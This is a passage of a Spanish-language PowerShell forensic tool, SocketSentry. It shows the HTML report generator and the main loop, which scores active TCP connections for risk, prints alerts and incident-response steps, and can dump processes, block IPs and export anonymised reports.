            $procInfo = Get-EnrichedProcessInfo -TargetPID $conn.OwningProcess
        }

        $auditItem = Invoke-ConnectionRiskAssessment -Connection $conn -ProcessInfo $procInfo -Database $Database -ResolveNames:$ResolveDNS

        if ($ShowOnlySuspicious -and ($auditItem.ScoreRiesgo -lt $Threshold)) {
            continue
        }

        $results.Add($auditItem)
    }

    return $results
}

# Generador de Reporte HTML Interactivo
function Export-AuditHTMLReport {
    param(
        [array]$Results,
        [string]$OutputPath,
        [switch]$Anonimizar
    )

    $criticos = @($Results | Where-Object { $_.NivelRiesgo -eq 'CRITICO' }).Count
    $sospechosos = @($Results | Where-Object { $_.NivelRiesgo -eq 'SOSPECHOSO' }).Count
    $informativos = @($Results | Where-Object { $_.NivelRiesgo -eq 'INFORMATIVO' }).Count
    $confiables = @($Results | Where-Object { $_.NivelRiesgo -eq 'CONFIABLE' }).Count

    $filasHtmlList = [System.Collections.Generic.List[string]]::new()
    foreach ($item in $Results) {
        $badgeClass = switch ($item.NivelRiesgo) {
            'CRITICO'    { "badge-danger" }
            'SOSPECHOSO' { "badge-warning" }
            'INFORMATIVO'{ "badge-info" }
            default      { "badge-success" }
        }

        $rutaItem = if ($Anonimizar -and $item.Ruta) {
            $item.Ruta -replace '(?i)C:\\Users\\[^\\]+', 'C:\Users\Usuario'
        } else {
            $item.Ruta
        }

        $rutaCorta = if ($rutaItem -and $rutaItem.Length -gt 45) {
            "..." + $rutaItem.Substring($rutaItem.Length - 42)
        } else {
            $rutaItem
        }

        $fila = "<tr>" +
            "<td><span class='badge $badgeClass'>" + $item.NivelRiesgo + " (" + $item.ScoreRiesgo + ")</span></td>" +
            "<td><strong>" + $item.Proceso + "</strong> (PID: " + $item.PID + ")</td>" +
            "<td><code title='" + [System.Web.HttpUtility]::HtmlEncode($rutaItem) + "'>" + [System.Web.HttpUtility]::HtmlEncode($rutaCorta) + "</code></td>" +
            "<td>" + [System.Web.HttpUtility]::HtmlEncode($item.Firmante) + "</td>" +
            "<td><code>" + $item.IPRemota + ":" + $item.PuertoRemoto + "</code></td>" +
            "<td>" + [System.Web.HttpUtility]::HtmlEncode($item.HostnameRemoto) + "</td>" +
            "<td class='motivo'>" + [System.Web.HttpUtility]::HtmlEncode($item.Motivos) + "</td>" +
            "</tr>"
        $filasHtmlList.Add($fila)
    }
    $tbody = $filasHtmlList -join "`n"

    $css = @'
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; padding: 24px; }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { margin-bottom: 4px; color: #38bdf8; font-size: 26px; }
        .subtitle { color: #94a3b8; margin-top: 0; margin-bottom: 24px; font-size: 14px; }
        .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 24px; }
        .card { background: #1e293b; border-radius: 8px; padding: 16px; border-left: 4px solid #64748b; }
        .card.danger { border-color: #ef4444; }
        .card.warning { border-color: #f59e0b; }
        .card.info { border-color: #06b6d4; }
        .card.success { border-color: #10b981; }
        .card-title { font-size: 13px; color: #94a3b8; text-transform: uppercase; font-weight: 600; }
        .card-value { font-size: 28px; font-weight: 700; margin-top: 8px; }
        table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 8px; overflow: hidden; font-size: 13px; }
        th, td { padding: 12px 14px; text-align: left; border-bottom: 1px solid #334155; vertical-align: middle; }
        th { background: #0f172a; color: #cbd5e1; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
        tr:hover { background-color: #27354f; }
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; display: inline-block; }
        .badge-danger { background-color: #7f1d1d; color: #fca5a5; border: 1px solid #ef4444; }
        .badge-warning { background-color: #78350f; color: #fde68a; border: 1px solid #f59e0b; }
        .badge-info { background-color: #164e63; color: #a5f3fc; border: 1px solid #06b6d4; }
        .badge-success { background-color: #064e3b; color: #a7f3d0; border: 1px solid #10b981; }
        code { font-family: ui-monospace, Consolas, Monaco, monospace; color: #38bdf8; background: #0b1120; padding: 2px 6px; border-radius: 4px; }
        .motivo { color: #e2e8f0; font-size: 12px; }
        .footer { text-align: center; margin-top: 24px; color: #64748b; font-size: 12px; }
'@

    $fechaStr = (Get-Date).ToString('dd/MM/yyyy HH:mm:ss')
    $hostName = if ($Anonimizar) { "WORKSTATION" } else { $env:COMPUTERNAME }
    $userName = if ($Anonimizar) { "AnalistaDFIR" } else { $env:USERNAME }

    $html = @"
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>SocketSentry - Informe Forense de Conexiones de Red</title>
    <style>
$css
    </style>
</head>
<body>
    <div class="container">
        <h1>SocketSentry: Analisis Forense de Conexiones de Red</h1>
        <p class="subtitle">Generado el: $fechaStr | Host: $hostName | Usuario: $userName</p>
        
        <div class="cards">
            <div class="card danger">
                <div class="card-title">Criticas / C2</div>
                <div class="card-value" style="color: #ef4444;">$criticos</div>
            </div>
            <div class="card warning">
                <div class="card-title">Sospechosas</div>
                <div class="card-value" style="color: #f59e0b;">$sospechosos</div>
            </div>
            <div class="card info">
                <div class="card-title">Informativas</div>
                <div class="card-value" style="color: #06b6d4;">$informativos</div>
            </div>
            <div class="card success">
                <div class="card-title">Confiables / Firmadas</div>
                <div class="card-value" style="color: #10b981;">$confiables</div>
            </div>
        </div>

        <table>
            <thead>
                <tr>
                    <th>Nivel / Score</th>
                    <th>Proceso</th>
                    <th>Ruta de Ejecucion</th>
                    <th>Firma Authenticode</th>
                    <th>Destino Remoto</th>
                    <th>Hostname</th>
                    <th>Evidencia / Motivos</th>
                </tr>
            </thead>
            <tbody>
$tbody
            </tbody>
        </table>

        <div class="footer">
            SocketSentry &copy; 2026. Framework Forense y Caza de Amenazas en Windows.
        </div>
    </div>
</body>
</html>
"@

    $html | Out-File -FilePath $OutputPath -Encoding UTF8
    Write-Host " [OK] Informe HTML exportado exitosamente a: $OutputPath" -ForegroundColor Green
}

# ==============================================================================
# Bucle Principal de Ejecucion
# ==============================================================================

Clear-Host
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "           SOCKETSENTRY: CAZA DE CONEXIONES SOSPECHOSAS               " -ForegroundColor Yellow -BackgroundColor Black
Write-Host "    Inspeccion Forense de Conexiones Activas, Firmas y Reputacion    " -ForegroundColor Gray
Write-Host "======================================================================" -ForegroundColor Cyan

# Alerta de elevacion
if (!(Test-IsAdmin)) {
    Write-Host " [!] ADVERTENCIA: PowerShell no se esta ejecutando como Administrador." -ForegroundColor Yellow
    Write-Host "     Algunos procesos del sistema de otros usuarios no mostraran ruta ni firma." -ForegroundColor Gray
    Write-Host "     Para un analisis forense exhaustivo, ejecuta PowerShell como Administrador.`n" -ForegroundColor Gray
}

# Resolucion segura de ruta a base de datos
if ([string]::IsNullOrWhiteSpace($BaseDatosPath)) {
    $scriptDir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
    if ([string]::IsNullOrWhiteSpace($scriptDir)) { $scriptDir = (Get-Location).Path }
    $BaseDatosPath = Join-Path $scriptDir "db_conexiones.json"
}

# Cargar base de datos
Write-Host " [*] Cargando base de datos de firmas y reglas de reputacion..." -ForegroundColor Cyan
$database = Get-ThreatDatabase -Path $BaseDatosPath

# Actualizacion de Feeds si fue solicitada
if ($ActualizarFeeds) {
    Update-ThreatFeeds -DbPath $BaseDatosPath -Database $database
    # Recargar con los datos frescos
    $database = Get-ThreatDatabase -Path $BaseDatosPath
}

$c2Contador = if ($database.IOC_C2_IPs) { @($database.IOC_C2_IPs.PSObject.Properties).Count } else { 0 }
Write-Host " [OK] Base de datos activa: $(@($database.RutasSospechosas).Count) reglas de rutas, $(@($database.LOLBins).Count) LOLBins, $(@($database.PuertosSospechosos).Count) puertos de malware, $c2Contador IOCs C2 en vivo." -ForegroundColor Green
if ($database.UltimaActualizacionFeeds -and $database.UltimaActualizacionFeeds -ne 'Nunca') {
    Write-Host "      (Ultima sincronizacion de feeds: $($database.UltimaActualizacionFeeds))" -ForegroundColor Gray
}

if ($SimularSospechoso) {
    Write-Host " [i] MODO DEMOSTRACION ACTIVO: Se inyectaran conexiones sospechosas simuladas para demostracion.`n" -ForegroundColor Magenta
} else {
    Write-Host ""
}

do {
    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    Write-Host "[$timestamp] Escaneando conexiones TCP y correlacionando procesos..." -ForegroundColor Cyan

    $auditResults = Invoke-AuditCycle -Database $database -ShowOnlySuspicious:$SoloSospechosas -Threshold $UmbralAlerta -ResolveDNS:$ResolverDNS -IncludeLocals:$IncluirLocales -Simulate:$SimularSospechoso

    # Resumen de metricas
    $criticas = @($auditResults | Where-Object { $_.NivelRiesgo -eq 'CRITICO' })
    $sospechosas = @($auditResults | Where-Object { $_.NivelRiesgo -eq 'SOSPECHOSO' })
    $informativas = @($auditResults | Where-Object { $_.NivelRiesgo -eq 'INFORMATIVO' })
    $confiables = @($auditResults | Where-Object { $_.NivelRiesgo -eq 'CONFIABLE' })

    Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host " RESUMEN: $($auditResults.Count) Evaluadas | " -NoNewline
    Write-Host "$($criticas.Count) Criticas " -ForegroundColor Red -NoNewline
    Write-Host "| $($sospechosas.Count) Sospechosas " -ForegroundColor Yellow -NoNewline
    Write-Host "| $($informativas.Count) Informativas " -ForegroundColor Cyan -NoNewline
    Write-Host "| $($confiables.Count) Confiables" -ForegroundColor Green
    Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray

    # Demostracion detallada de conexiones sospechosas o criticas
    $amenazas = @($criticas + $sospechosas)
    if ($amenazas.Count -gt 0) {
        Write-Host "`n [!!!] ALERTA: SE DETECTARON CONEXIONES CON INDICIOS SOSPECHOSOS:`n" -ForegroundColor Red
        
        foreach ($amenaza in $amenazas) {
            $badgeColor = if ($amenaza.NivelRiesgo -eq 'CRITICO') { "Red" } else { "Yellow" }
            Write-Host " > [$($amenaza.NivelRiesgo) - Score $($amenaza.ScoreRiesgo)/100] " -ForegroundColor $badgeColor -NoNewline
            Write-Host "$($amenaza.Proceso) (PID: $($amenaza.PID)) -> $($amenaza.IPRemota):$($amenaza.PuertoRemoto)" -ForegroundColor White
            
            Write-Host "   +-- Ruta Ejecutable: " -ForegroundColor DarkGray -NoNewline
            Write-Host "$($amenaza.Ruta)" -ForegroundColor Gray

            if ($amenaza.CommandLine) {
                Write-Host "   +-- Linea Comandos:  " -ForegroundColor DarkGray -NoNewline
                Write-Host "$($amenaza.CommandLine)" -ForegroundColor Cyan
            }
            
            Write-Host "   +-- Firma Digital:   " -ForegroundColor DarkGray -NoNewline
            if ($amenaza.FirmaValida) {
                Write-Host "Valida ($($amenaza.Firmante))" -ForegroundColor Green
            } else {
                Write-Host "NO VALIDA / SIN FIRMA ($($amenaza.Firmante))" -ForegroundColor Red
            }

            Write-Host "   +-- Hostname / DNS:  " -ForegroundColor DarkGray -NoNewline
            Write-Host "$($amenaza.HostnameRemoto)" -ForegroundColor Gray

            if ($amenaza.HashSHA256) {
                Write-Host "   +-- Hash SHA256:     " -ForegroundColor DarkGray -NoNewline
                Write-Host "$($amenaza.HashSHA256)" -ForegroundColor DarkCyan
            }

            Write-Host "   +-- Evidencias:      " -ForegroundColor DarkGray -NoNewline
            Write-Host "$($amenaza.Motivos)" -ForegroundColor $badgeColor
            Write-Host ""

            # Acciones Forenses y de Respuesta
            if ($CrearDump -and $amenaza.PID -gt 4) {
                New-ProcessMiniDump -TargetPID $amenaza.PID -ProcessName $amenaza.Proceso | Out-Null
            }

            if ($BloquearIP -and $amenaza.NivelRiesgo -eq 'CRITICO') {
                Block-SuspiciousIP -IPAddress $amenaza.IPRemota
            }
        }

        Write-Host " >>> PROTOCOLO FORENSE RECOMENDADO ANTE SOSPECHA:" -ForegroundColor Cyan
        Write-Host "   1. AISLAR RED: Desconectar cable Ethernet / deshabilitar Wi-Fi inmediatamente." -ForegroundColor Yellow
        Write-Host "   2. NO APAGAR NI REINICIAR: Se perderia la memoria RAM y evidencia volatil de la conexion." -ForegroundColor Yellow
        Write-Host "   3. VOLCADO DE MEMORIA: Dumpear el proceso con -CrearDump o Administrador de Tareas." -ForegroundColor Yellow
        Write-Host "   4. INVESTIGAR HASH/IP: Consultar el hash SHA256 y la IP en VirusTotal o AbuseIPDB." -ForegroundColor Yellow
        Write-Host "----------------------------------------------------------------------`n" -ForegroundColor DarkGray
    } else {
        Write-Host " [OK] No se detectaron conexiones sospechosas que superen el umbral ($UmbralAlerta puntos)." -ForegroundColor Green
    }

    # Mostrar tabla resumen formateada
    if (!$SoloSospechosas) {
        Write-Host "`n Detalle de Conexiones Evaluadas:" -ForegroundColor Cyan
        $auditResults | Select-Object `
            @{Name="Riesgo"; Expression={"$($_.NivelRiesgo) ($($_.ScoreRiesgo))"}}, `
            Proceso, PID, `
            @{Name="Destino"; Expression={"$($_.IPRemota):$($_.PuertoRemoto)"}}, `
            @{Name="Firma"; Expression={if ($_.FirmaValida) { "Valida" } else { "Sin Firma" }}}, `
            @{Name="Evidencia"; Expression={if ($_.Motivos.Length -gt 55) { $_.Motivos.Substring(0,52) + "..." } else { $_.Motivos }}} | `
            Format-Table -AutoSize
    }

    # Exportaciones si fueron solicitadas
    if (![string]::IsNullOrWhiteSpace($ExportarHTML)) {
        Export-AuditHTMLReport -Results $auditResults -OutputPath $ExportarHTML -Anonimizar:$Anonimizar
    }

    if (![string]::IsNullOrWhiteSpace($ExportarCSV)) {
        $exportData = if ($Anonimizar) {
            $auditResults | ForEach-Object {
                $copy = $_.PSObject.Copy()
                if ($copy.Ruta) { $copy.Ruta = $copy.Ruta -replace '(?i)C:\\Users\\[^\\]+', 'C:\Users\Usuario' }
                $copy
            }
        } else {
            $auditResults
        }
        $exportData | Export-Csv -Path $ExportarCSV -NoTypeInformation -Encoding UTF8
        Write-Host " [OK] Evidencia exportada a CSV en: $ExportarCSV" -ForegroundColor Green
    }

    if ($Monitor) {
        Write-Host "`n [Modo Monitor] Esperando $IntervaloSegundos segundos para el proximo escaneo... (Ctrl+C para salir)" -ForegroundColor DarkGray
        Start-Sleep -Seconds $IntervaloSegundos
        Clear-Host
    }

} while ($Monitor)
